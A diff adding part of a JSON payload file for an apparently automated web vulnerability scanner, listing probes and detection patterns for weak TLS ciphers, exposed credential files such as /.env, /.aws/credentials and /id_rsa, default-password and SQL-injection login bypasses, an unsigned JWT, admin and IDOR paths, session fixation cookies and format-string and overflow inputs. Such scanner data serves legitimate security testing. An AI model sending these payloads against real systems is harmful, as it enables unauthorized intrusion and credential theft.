+        {
+          "payload": "weak_dh1024_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "dh1024_probe"
+        },
+        {
+          "payload": "export_cipher_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "export_cipher"
+        },
+        {
+          "payload": "null_cipher_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "null_cipher"
+        },
+        {
+          "payload": "anon_dh_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "anon_dh"
+        },
+        {
+          "payload": "poodle_test_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "poodle_probe"
+        },
+        {
+          "payload": "beast_test_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "beast_probe"
+        },
+        {
+          "payload": "heartbleed_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "heartbleed"
+        },
+        {
+          "payload": "crime_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "crime_probe"
+        },
+        {
+          "payload": "drown_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "drown_probe"
+        },
+        {
+          "payload": "ticketbleed_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "ticketbleed"
+        },
+        {
+          "payload": "lucky13_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "lucky13_probe"
+        },
+        {
+          "payload": "weak_cipher_detection_SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "TLS_RSA_WITH_RC4_128_MD5"
+          },
+          {
+            "type": "string",
+            "value": "SSL_CK_RC4_128_WITH_MD5"
+          },
+          {
+            "type": "string",
+            "value": "TLS_RSA_WITH_DES_CBC_SHA"
+          },
+          {
+            "type": "string",
+            "value": "SSLv3"
+          },
+          {
+            "type": "string",
+            "value": "TLSv1.0"
+          },
+          {
+            "type": "string",
+            "value": "TLSv1.1"
+          },
+          {
+            "type": "regex",
+            "value": "MD5WithRSAEncryption"
+          },
+          {
+            "type": "regex",
+            "value": "sha1WithRSAEncryption"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Strict-Transport-Security.*missing"
+          },
+          {
+            "type": "string",
+            "value": "EXPORT_"
+          },
+          {
+            "type": "regex",
+            "value": "NULL.*cipher"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "CredsExpose": {
+      "name_abbr": "CredsExpose",
+      "name_full": "exposed_credentials",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/.env",
+          "encoding": "none",
+          "type": "env"
+        },
+        {
+          "payload": "/.env.local",
+          "encoding": "none",
+          "type": "env_local"
+        },
+        {
+          "payload": "/.env.production",
+          "encoding": "none",
+          "type": "env_prod"
+        },
+        {
+          "payload": "/.env.backup",
+          "encoding": "none",
+          "type": "env_backup"
+        },
+        {
+          "payload": "/.git/config",
+          "encoding": "none",
+          "type": "git_config"
+        },
+        {
+          "payload": "/.aws/credentials",
+          "encoding": "none",
+          "type": "aws_creds"
+        },
+        {
+          "payload": "/.aws/config",
+          "encoding": "none",
+          "type": "aws_config"
+        },
+        {
+          "payload": "/database.yml",
+          "encoding": "none",
+          "type": "db_yml"
+        },
+        {
+          "payload": "/wp-config.php",
+          "encoding": "none",
+          "type": "wordpress"
+        },
+        {
+          "payload": "/config.json",
+          "encoding": "none",
+          "type": "config_json"
+        },
+        {
+          "payload": "/secrets.yml",
+          "encoding": "none",
+          "type": "secrets_yml"
+        },
+        {
+          "payload": "/credentials.json",
+          "encoding": "none",
+          "type": "gcp_creds"
+        },
+        {
+          "payload": "/service-account.json",
+          "encoding": "none",
+          "type": "gcp_sa"
+        },
+        {
+          "payload": "/application.properties",
+          "encoding": "none",
+          "type": "spring_props"
+        },
+        {
+          "payload": "/application.yml",
+          "encoding": "none",
+          "type": "spring_yml"
+        },
+        {
+          "payload": "/config/database.php",
+          "encoding": "none",
+          "type": "laravel_db"
+        },
+        {
+          "payload": "/.netrc",
+          "encoding": "none",
+          "type": "netrc"
+        },
+        {
+          "payload": "/settings.py",
+          "encoding": "none",
+          "type": "django_settings"
+        },
+        {
+          "payload": "/config/secrets.exs",
+          "encoding": "none",
+          "type": "elixir_secrets"
+        },
+        {
+          "payload": "/.htpasswd",
+          "encoding": "none",
+          "type": "htpasswd"
+        },
+        {
+          "payload": "/config/master.key",
+          "encoding": "none",
+          "type": "rails_master_key"
+        },
+        {
+          "payload": "/id_rsa",
+          "encoding": "none",
+          "type": "ssh_private_key"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "DB_PASSWORD\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "DATABASE_PASSWORD\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "API_KEY\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "API_SECRET\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "SECRET_KEY\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "aws_access_key_id\\s*=\\s*[A-Z0-9]+"
+          },
+          {
+            "type": "regex",
+            "value": "aws_secret_access_key\\s*=\\s*\\S+"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN RSA PRIVATE KEY-----"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN PRIVATE KEY-----"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN OPENSSH PRIVATE KEY-----"
+          },
+          {
+            "type": "regex",
+            "value": "define\\('DB_PASSWORD'"
+          },
+          {
+            "type": "regex",
+            "value": "define\\('DB_USER'"
+          },
+          {
+            "type": "regex",
+            "value": "password:\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "\"private_key\":\\s*\"-----BEGIN"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "BrokenAuth": {
+      "name_abbr": "BrokenAuth",
+      "name_full": "broken_authentication",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "username=admin&password=admin&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_admin"
+        },
+        {
+          "payload": "username=admin&password=password&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_password"
+        },
+        {
+          "payload": "username=admin&password=admin123&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_admin123"
+        },
+        {
+          "payload": "username=admin&password=123456&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_123456"
+        },
+        {
+          "payload": "username=root&password=root&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_root"
+        },
+        {
+          "payload": "username=root&password=toor&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_toor"
+        },
+        {
+          "payload": "username=administrator&password=password&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_administrator"
+        },
+        {
+          "payload": "username=test&password=test&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_test"
+        },
+        {
+          "payload": "username=guest&password=guest&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "default_guest"
+        },
+        {
+          "payload": "username=admin&password=&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "empty_password"
+        },
+        {
+          "payload": "username=SHLD{{MARKER}}&password=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "marker_creds"
+        },
+        {
+          "payload": "Authorization: Basic YWRtaW46YWRtaW4=",
+          "encoding": "none",
+          "type": "basic_auth_admin"
+        },
+        {
+          "payload": "Authorization: Basic cm9vdDpyb290",
+          "encoding": "none",
+          "type": "basic_auth_root"
+        },
+        {
+          "payload": "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+          "encoding": "none",
+          "type": "bearer_none_alg"
+        },
+        {
+          "payload": "username=admin'--&password=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "sqli_auth_bypass"
+        },
+        {
+          "payload": "username=admin' OR '1'='1'--&password=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "sqli_or_bypass"
+        },
+        {
+          "payload": "username=SHLD{{MARKER}}&password=SHLD{{MARKER}}&remember_me=1",
+          "encoding": "none",
+          "type": "remember_me_probe"
+        },
+        {
+          "payload": "username=admin&password=admin&_method=GET&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "method_override"
+        },
+        {
+          "payload": "username=admin&password=admin%00SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "null_byte_bypass"
+        },
+        {
+          "payload": "username=admin&password=admin&ref=SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "username=admin&password=admin&ref=SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "Welcome.*admin"
+          },
+          {
+            "type": "string",
+            "value": "Logged in as"
+          },
+          {
+            "type": "string",
+            "value": "Dashboard"
+          },
+          {
+            "type": "string",
+            "value": "My Account"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*session="
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*auth="
+          },
+          {
+            "type": "regex",
+            "value": "\"access_token\"\\s*:\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "\"auth_token\"\\s*:\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 302"
+          },
+          {
+            "type": "string",
+            "value": "Login successful"
+          },
+          {
+            "type": "regex",
+            "value": "\"role\"\\s*:\\s*\"admin\""
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecPerm": {
+      "name_abbr": "InsecPerm",
+      "name_full": "insecure_permissions",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/admin?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "admin_path"
+        },
+        {
+          "payload": "/administrator?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "administrator_path"
+        },
+        {
+          "payload": "/admin.php?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "admin_php"
+        },
+        {
+          "payload": "/cpanel?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "cpanel"
+        },
+        {
+          "payload": "/wp-admin?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "wordpress_admin"
+        },
+        {
+          "payload": "/api/admin?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "api_admin"
+        },
+        {
+          "payload": "/admin/dashboard?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "admin_dashboard"
+        },
+        {
+          "payload": "/manager/html?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "tomcat_manager"
+        },
+        {
+          "payload": "/phpmyadmin?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "phpmyadmin"
+        },
+        {
+          "payload": "/api/users/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "user_idor"
+        },
+        {
+          "payload": "/account/9999?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "account_idor"
+        },
+        {
+          "payload": "/api/v1/admin/users?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "api_admin_users"
+        },
+        {
+          "payload": "/internal/metrics?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "internal_metrics"
+        },
+        {
+          "payload": "/actuator/env?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "spring_actuator"
+        },
+        {
+          "payload": "/actuator/heapdump?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "spring_heapdump"
+        },
+        {
+          "payload": "/_debug/default/view?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "symfony_debug"
+        },
+        {
+          "payload": "/server-status?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "apache_status"
+        },
+        {
+          "payload": "/nginx_status?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "nginx_status"
+        },
+        {
+          "payload": "/file/download?id=999&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "file_download"
+        },
+        {
+          "payload": "/admin?ref=SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "/admin?ref=SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "/graphql-playground?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "graphql_playground"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "Admin Panel"
+          },
+          {
+            "type": "string",
+            "value": "Administration Console"
+          },
+          {
+            "type": "string",
+            "value": "phpMyAdmin"
+          },
+          {
+            "type": "string",
+            "value": "cPanel"
+          },
+          {
+            "type": "string",
+            "value": "Apache Tomcat Manager"
+          },
+          {
+            "type": "string",
+            "value": "WordPress Dashboard"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 200"
+          },
+          {
+            "type": "string",
+            "value": "actuator"
+          },
+          {
+            "type": "regex",
+            "value": "server_status.*apache"
+          },
+          {
+            "type": "string",
+            "value": "Spring Boot Actuator"
+          },
+          {
+            "type": "regex",
+            "value": "\"heap\".*\"size\""
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "SessFix": {
+      "name_abbr": "SessFix",
+      "name_full": "session_fixation",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "cookie",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "PHPSESSID=SHLD{{MARKER}}_fixed_session",
+          "encoding": "none",
+          "type": "php_fixation"
+        },
+        {
+          "payload": "JSESSIONID=SHLD{{MARKER}}_fixed_id",
+          "encoding": "none",
+          "type": "java_fixation"
+        },
+        {
+          "payload": "ASP.NET_SessionId=SHLD{{MARKER}}_fixed",
+          "encoding": "none",
+          "type": "aspnet_fixation"
+        },
+        {
+          "payload": "session_token=SHLD{{MARKER}}_predictable",
+          "encoding": "none",
+          "type": "generic_fixation"
+        },
+        {
+          "payload": "?PHPSESSID=SHLD{{MARKER}}_attacker",
+          "encoding": "none",
+          "type": "query_php"
+        },
+        {
+          "payload": "?sessionid=SHLD{{MARKER}}_known_val",
+          "encoding": "none",
+          "type": "query_generic"
+        },
+        {
+          "payload": "?session_key=SHLD{{MARKER}}_attacker",
+          "encoding": "none",
+          "type": "query_key"
+        },
+        {
+          "payload": "?token=SHLD{{MARKER}}_fixed",
+          "encoding": "none",
+          "type": "query_token"
+        },
+        {
+          "payload": "sid=SHLD{{MARKER}}_fixed_val",
+          "encoding": "none",
+          "type": "sid_fixation"
+        },
+        {
+          "payload": "auth=SHLD{{MARKER}}_fixed_auth",
+          "encoding": "none",
+          "type": "auth_fixation"
+        },
+        {
+          "payload": "remember_token=SHLD{{MARKER}}_weak",
+          "encoding": "none",
+          "type": "remember_token"
+        },
+        {
+          "payload": "sso_token=SHLD{{MARKER}}_fixed",
+          "encoding": "none",
+          "type": "sso_fixation"
+        },
+        {
+          "payload": "PHPSESSID=000000000000000000000000SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "predictable_id"
+        },
+        {
+          "payload": "session=aaaaaaaaaaaaaaaaaaaaSHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "weak_entropy"
+        },
+        {
+          "payload": "PHPSESSID=SHLD{{MARKER}}_fixed_session",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "PHPSESSID=SHLD{{MARKER}}_fixed_session",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "?csrf=SHLD{{MARKER}}&session_fixation=1",
+          "encoding": "none",
+          "type": "csrf_session_combo"
+        },
+        {
+          "payload": "?redirect_after_login=/admin&sid=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "login_redirect_fixation"
+        },
+        {
+          "payload": "RACK_SESSION=SHLD{{MARKER}}_rack_fixed",
+          "encoding": "none",
+          "type": "rack_session"
+        },
+        {
+          "payload": "laravel_session=SHLD{{MARKER}}_laravel",
+          "encoding": "none",
+          "type": "laravel_session"
+        },
+        {
+          "payload": "express.sid=s%3ASHLD{{MARKER}}_express.XXXX",
+          "encoding": "none",
+          "type": "express_session"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*PHPSESSID=SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*JSESSIONID=SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*session[^=]*=SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "session_id reused"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*auth=SHLD"
+          },
+          {
+            "type": "regex",
+            "value": "predictable_token"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*HttpOnly.*missing"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*Secure.*missing"
+          },
+          {
+            "type": "regex",
+            "value": "Session-Id:\\s*SHLD"
+          },
+          {
+            "type": "string",
+            "value": "fixed session accepted"
+          },
+          {
+            "type": "regex",
+            "value": "\"sessionId\"\\s*:\\s*\"SHLD"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "BufOvr": {
+      "name_abbr": "BufOvr",
+      "name_full": "buffer_overflow",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP",
+          "encoding": "none",
+          "type": "pattern_small",
+          "repeat": 100
+        },
+        {
+          "payload": "SHLD{{MARKER}}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "encoding": "none",
+          "type": "marker_overflow_256"
+        },
+        {
+          "payload": "SHLD{{MARKER}}%x.%x.%x.%x.%x.%x.%x.%x.%x.%x",
+          "encoding": "none",
+          "type": "format_string_marker"
+        },
+        {
+          "payload": "%s%s%s%s%s%s%s%s%s%sSHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "format_string_s"
+        },
+        {
+          "payload": "%n%n%n%n%n%n%nSHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "format_string_n"
+        },
+        {
+          "payload": "%.256x%.256x%.256x%.256x%.256xSHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "format_width"
+        },
+        {
+          "payload": "SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "overflow_large",
+          "repeat": 10000
+        },
+        {
+          "payload": "\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "hex_buffer"
+        },
+        {
+          "payload": "SHLD{{MARKER}}\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
+          "encoding": "none",
+          "type": "nop_sled"
+        },
+        {
+          "payload": "SHLD{{MARKER}}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
+          "encoding": "none",
+          "type": "null_overflow"
+        },
+        {
+          "payload": "SHLD{{MARKER}}&input=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "encoding": "none",
+          "type": "param_overflow"
+        },
+        {
+          "payload": "{\"key\": \"SHLD{{MARKER}}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}",
+          "encoding": "none",
+          "type": "json_overflow"
+        },
+        {
+          "payload": "<value>SHLD{{MARKER}}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</value>",
+          "encoding": "none",
+          "type": "xml_overflow"
+        },
+        {
+          "payload": "SHLD{{MARKER}}Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9",
+          "encoding": "none",
+          "type": "cyclic_pattern"
+        },
+        {
+          "payload": "SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "overflow_medium",
+          "repeat": 5000
+        },
+        {
+          "payload": "SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "overflow_10k",
+          "repeat": 10000
+        },
+        {
+          "payload": "User-Agent: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "header_overflow",
+          "repeat": 8192
+        },
+        {
+          "payload": "SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded",
+          "repeat": 5000
+        },
+        {
+          "payload": "SHLD{{MARKER}}\\xef\\xbf\\xbd\\xef\\xbf\\xbd\\xef\\xbf\\xbd",
+          "encoding": "none",
+          "type": "unicode_overflow"
+        },
+        {
+          "payload": "SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_overflow",
+          "repeat": 2048
+        },
+        {
+          "payload": "SHLD{{MARKER}}%c0%af%c0%af%c0%af%c0%af%c0%af",
+          "encoding": "none",
+          "type": "utf8_overflow"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "segmentation fault"
+          },
+          {
+            "type": "string",
+            "value": "Segmentation fault"
+          },
+          {
+            "type": "string",
+            "value": "memory corruption"
+          },
+          {
+            "type": "string",
+            "value": "stack smashing detected"
+          },
+          {
+            "type": "string",
+            "value": "*** stack smashing detected ***"
+          },
+          {
+            "type": "string",
+            "value": "abort() called"
+          },
+          {
+            "type": "string",
+            "value": "Aborted (core dumped)"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 500"
+          },
+          {
+            "type": "regex",
+            "value": "core dumped"
+          },
+          {
+            "type": "regex",
+            "value": "signal 11"
+          },
+          {
+            "type": "string",
+            "value": "EIP overwrite"
+          }
+        ],
+        "delay_based": false
+      }
+    }
+  }
+}
